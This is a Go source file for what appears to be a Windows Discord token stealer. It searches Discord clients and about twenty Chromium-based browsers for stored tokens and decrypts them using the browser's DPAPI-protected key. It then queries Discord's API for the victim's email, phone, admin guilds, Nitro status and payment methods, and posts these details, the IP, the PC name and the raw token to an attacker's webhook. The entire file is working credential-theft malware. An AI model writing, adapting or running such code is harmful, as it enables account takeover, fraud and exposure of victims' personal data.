package discord

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var PATHS = map[string]string{
	"Discord":              os.Getenv("APPDATA") + "\\discord",
	"Discord Canary":       os.Getenv("APPDATA") + "\\discordcanary",
	"Lightcord":            os.Getenv("APPDATA") + "\\Lightcord",
	"Discord PTB":          os.Getenv("APPDATA") + "\\discordptb",
	"Opera":                os.Getenv("APPDATA") + "\\Opera Software\\Opera Stable",
	"Opera GX":             os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Stable",
	"Amigo":                os.Getenv("LOCALAPPDATA") + "\\Amigo\\User Data",
	"Torch":                os.Getenv("LOCALAPPDATA") + "\\Torch\\User Data",
	"Kometa":               os.Getenv("LOCALAPPDATA") + "\\Kometa\\User Data",
	"Orbitum":              os.Getenv("LOCALAPPDATA") + "\\Orbitum\\User Data",
	"CentBrowser":          os.Getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data",
	"7Star":                os.Getenv("LOCALAPPDATA") + "\\7Star\\7Star\\User Data",
	"Sputnik":              os.Getenv("LOCALAPPDATA") + "\\Sputnik\\Sputnik\\User Data",
	"Vivaldi":              os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default",
	"Chrome SxS":           os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome SxS\\User Data",
	"Chrome":               os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
	"Epic Privacy Browser": os.Getenv("LOCALAPPDATA") + "\\Epic Privacy Browser\\User Data",
	"Microsoft Edge":       os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default",
	"Uran":                 os.Getenv("LOCALAPPDATA") + "\\uCozMedia\\Uran\\User Data\\Default",
	"Yandex":               os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default",
	"Brave":                os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Iridium":              os.Getenv("LOCALAPPDATA") + "\\Iridium\\User Data\\Default",
}

type UserData struct {
	ID       string `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
	Phone    string `json:"phone"`
	Avatar   string `json:"avatar"`
	Flags    int    `json:"flags"`
	Locale   string `json:"locale"`
	Verified bool   `json:"verified"`
	MFA      bool   `json:"mfa_enabled"`
}

type Guild struct {
	ID                      string `json:"id"`
	Name                    string `json:"name"`
	Permissions             int    `json:"permissions"`
	ApproximateMemberCount  int    `json:"approximate_member_count"`
	VanityURLCode          string `json:"vanity_url_code"`
}

type NitroSubscription struct {
	CurrentPeriodEnd string `json:"current_period_end"`
}

type BoostSlot struct {
	CooldownEndsAt string `json:"cooldown_ends_at"`
}

type PaymentMethod struct {
	Type    int  `json:"type"`
	Invalid bool `json:"invalid"`
}

type DiscordEmbed struct {
	Embeds []struct {
		Title       string `json:"title"`
		Description string `json:"description"`
		Color       int    `json:"color"`
		Footer      struct {
			Text string `json:"text"`
		} `json:"footer"`
		Thumbnail struct {
			URL string `json:"url"`
		} `json:"thumbnail"`
	} `json:"embeds"`
	Username   string `json:"username"`
	AvatarURL  string `json:"avatar_url"`
}

type Collector struct {
	WebhookURL string
}

func NewCollector(webhookURL string) *Collector {
	return &Collector{
		WebhookURL: webhookURL,
	}
}

func getHeaders(token string) map[string]string {
	headers := map[string]string{
		"Content-Type": "application/json",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	}
	if token != "" {
		headers["Authorization"] = token
	}
	return headers
}

func getTokens(path string) []string {
	path = filepath.Join(path, "Local Storage", "leveldb")
	tokens := []string{}

	if _, err := os.Stat(path); os.IsNotExist(err) {
		return tokens
	}

	files, err := os.ReadDir(path)
	if err != nil {
		return tokens
	}

	re := regexp.MustCompile(`dQw4w9WgXcQ:([^.*\['(.*)'\].*$][^\"]*)`)
	
	for _, file := range files {
		if !strings.HasSuffix(file.Name(), ".ldb") && !strings.HasSuffix(file.Name(), ".log") {
			continue
		}

		filePath := filepath.Join(path, file.Name())
		content, err := os.ReadFile(filePath)
		if err != nil {
			continue
		}

		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			matches := re.FindAllStringSubmatch(line, -1)
			for _, match := range matches {
				if len(match) > 1 {
					tokens = append(tokens, match[1])
				}
			}
		}
	}

	return tokens
}

func getKey(path string) ([]byte, error) {
	localStatePath := filepath.Join(path, "Local State")
	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(content, &localState); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	encryptedKey = encryptedKey[5:]
	var dataBlob windows.DataBlob
	dataBlob.Size = uint32(len(encryptedKey))
	dataBlob.Data = &encryptedKey[0]

	var outputBlob windows.DataBlob
	err = windows.CryptUnprotectData(&dataBlob, nil, nil, nil, nil, 0, &outputBlob)
	if err != nil {
		return nil, err
	}

	result := make([]byte, outputBlob.Size)
	copy(result, (*[1<<30 - 1]byte)(unsafe.Pointer(outputBlob.Data))[:outputBlob.Size:outputBlob.Size])

	return result, nil
}

func decryptToken(encryptedToken string, key []byte) (string, error) {
	parts := strings.Split(encryptedToken, "dQw4w9WgXcQ:")
	if len(parts) != 2 {
		return "", fmt.Errorf("formato de token inválido")
	}

	encryptedData, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	if len(encryptedData) < 15 {
		return "", fmt.Errorf("datos encriptados demasiado cortos")
	}

	nonce := encryptedData[3:15]
	ciphertext := encryptedData[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	if len(plaintext) >= 16 {
		plaintext = plaintext[:len(plaintext)-16]
	}

	return string(plaintext), nil
}

func getIP() string {
	resp, err := http.Get("https://api.ipify.org?format=json")
	if err != nil {
		return "None"
	}
	defer resp.Body.Close()

	var result struct {
		IP string `json:"ip"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "None"
	}

	return result.IP
}

func makeRequest(url string, headers map[string]string, method string, body io.Reader) ([]byte, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status code: %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

func (s *Collector) Start() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("este programa solo funciona en Windows")
	}

	checked := make(map[string]bool)

	for platform, path := range PATHS {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		tokens := getTokens(path)
		for _, token := range tokens {
			token = strings.TrimSuffix(token, "\\")

			if checked[token] {
				continue
			}
			checked[token] = true

			key, err := getKey(path)
			if err != nil {
				continue
			}

			decryptedToken, err := decryptToken(token, key)
			if err != nil {
				continue
			}

			headers := getHeaders(decryptedToken)
			userDataBytes, err := makeRequest("https://discord.com/api/v10/users/@me", headers, "GET", nil)
			if err != nil {
				continue
			}

			var userData UserData
			if err := json.Unmarshal(userDataBytes, &userData); err != nil {
				continue
			}

			badges := ""
			flags := userData.Flags
			if flags == 64 || flags == 96 {
				badges += ":BadgeBravery: "
			}
			if flags == 128 || flags == 160 {
				badges += ":BadgeBrilliance: "
			}
			if flags == 256 || flags == 288 {
				badges += ":BadgeBalance: "
			}

			params := url.Values{}
			params.Set("with_counts", "true")
			guildsURL := "https://discordapp.com/api/v6/users/@me/guilds?" + params.Encode()
			
			guildsBytes, err := makeRequest(guildsURL, headers, "GET", nil)
			if err != nil {
				continue
			}

			var guilds []Guild
			if err := json.Unmarshal(guildsBytes, &guilds); err != nil {
				continue
			}

			guildInfos := ""
			for _, guild := range guilds {
				if guild.Permissions&8 != 0 || guild.Permissions&32 != 0 {
					guildDetailURL := fmt.Sprintf("https://discordapp.com/api/v6/guilds/%s", guild.ID)
					guildDetailBytes, err := makeRequest(guildDetailURL, headers, "GET", nil)
					if err != nil {
						continue
					}

					var guildDetail Guild
					if err := json.Unmarshal(guildDetailBytes, &guildDetail); err != nil {
						continue
					}

					vanity := ""
					if guildDetail.VanityURLCode != "" {
						vanity = fmt.Sprintf("; .gg/%s", guildDetail.VanityURLCode)
					}

					guildInfos += fmt.Sprintf("\nㅤ- [%s]: %d%s", guild.Name, guild.ApproximateMemberCount, vanity)
				}
			}

			if guildInfos == "" {
				guildInfos = "No guilds"
			}

			nitroBytes, err := makeRequest("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers, "GET", nil)
			hasNitro := false
			expDate := ""
			if err == nil {
				var nitroSubs []NitroSubscription
				if err := json.Unmarshal(nitroBytes, &nitroSubs); err == nil && len(nitroSubs) > 0 {
					hasNitro = true
					badges += ":BadgeSubscriber: "
					
					if t, err := time.Parse("2006-01-02T15:04:05.000000Z", nitroSubs[0].CurrentPeriodEnd); err == nil {
						expDate = t.Format("02/01/2006 at 15:04:05")
					}
				}
			}

			boostBytes, err := makeRequest("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers, "GET", nil)
			available := 0
			printBoost := ""
			boost := false
			if err == nil {
				var boostSlots []BoostSlot
				if err := json.Unmarshal(boostBytes, &boostSlots); err == nil {
					for _, slot := range boostSlots {
						if cooldown, err := time.Parse("2006-01-02T15:04:05.000000Z", slot.CooldownEndsAt); err == nil {
							if cooldown.Sub(time.Now().UTC()) < 0 {
								printBoost += "ㅤ- Available now\n"
								available++
							} else {
								printBoost += fmt.Sprintf("ㅤ- Available on %s\n", cooldown.Format("02/01/2006 at 15:04:05"))
							}
							boost = true
						}
					}
				}
			}

			if boost {
				badges += ":BadgeBoost: "
			}

			paymentBytes, err := makeRequest("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers, "GET", nil)
			paymentMethods := 0
			paymentType := ""
			valid := 0
			if err == nil {
				var payments []PaymentMethod
				if err := json.Unmarshal(paymentBytes, &payments); err == nil {
					for _, payment := range payments {
						if payment.Type == 1 {
							paymentType += "CreditCard "
							if !payment.Invalid {
								valid++
							}
							paymentMethods++
						} else if payment.Type == 2 {
							paymentType += "PayPal "
							if !payment.Invalid {
								valid++
							}
							paymentMethods++
						}
					}
				}
			}

			printNitro := ""
			nnbutb := ""
			if hasNitro {
				printNitro = fmt.Sprintf("\nNitro Informations:\n```yaml\nHas Nitro: %t\nExpiration Date: %s\nBoosts Available: %d\n%s\n```", hasNitro, expDate, available, printBoost)
			} else if available > 0 {
				nnbutb = fmt.Sprintf("\nNitro Informations:\n```yaml\nBoosts Available: %d\n%s\n```", available, printBoost)
			}

			printPM := ""
			if paymentMethods > 0 {
				printPM = fmt.Sprintf("\nPayment Methods:\n```yaml\nAmount: %d\nValid Methods: %d method(s)\nType: %s\n```", paymentMethods, valid, paymentType)
			}

			description := fmt.Sprintf("```yaml\nUser ID: %s\nEmail: %s\nPhone Number: %s\n\nGuilds: %d\nAdmin Permissions: %s\n``` ```yaml\nMFA Enabled: %t\nFlags: %d\nLocale: %s\nVerified: %t\n```%s%s%s```yaml\nIP: %s\nUsername: %s\nPC Name: %s\nToken Location: %s\n```Token: \n```yaml\n%s```",
				userData.ID, userData.Email, userData.Phone, len(guilds), guildInfos, userData.MFA, flags, userData.Locale, userData.Verified,
				printNitro, nnbutb, printPM, getIP(), os.Getenv("USERNAME"), os.Getenv("COMPUTERNAME"), platform, decryptedToken)

			embed := DiscordEmbed{
				Embeds: []struct {
					Title       string `json:"title"`
					Description string `json:"description"`
					Color       int    `json:"color"`
					Footer      struct {
						Text string `json:"text"`
					} `json:"footer"`
					Thumbnail struct {
						URL string `json:"url"`
					} `json:"thumbnail"`
				}{
					{
						Title:       fmt.Sprintf("**New user data: %s**", userData.Username),
						Description: description,
						Color:       3092790,
						Footer: struct {
							Text string `json:"text"`
						}{
							Text: "Made by nwa.red",
						},
						Thumbnail: struct {
							URL string `json:"url"`
						}{
							URL: fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", userData.ID, userData.Avatar),
						},
					},
				},
				Username:  "Data Collector",
				AvatarURL: "https://i.imgur.com/A5UvM4h.png",
			}

			embedBytes, _ := json.Marshal(embed)
			makeRequest(s.WebhookURL, getHeaders(""), "POST", bytes.NewBuffer(embedBytes))
		}
	}

	return nil
} 
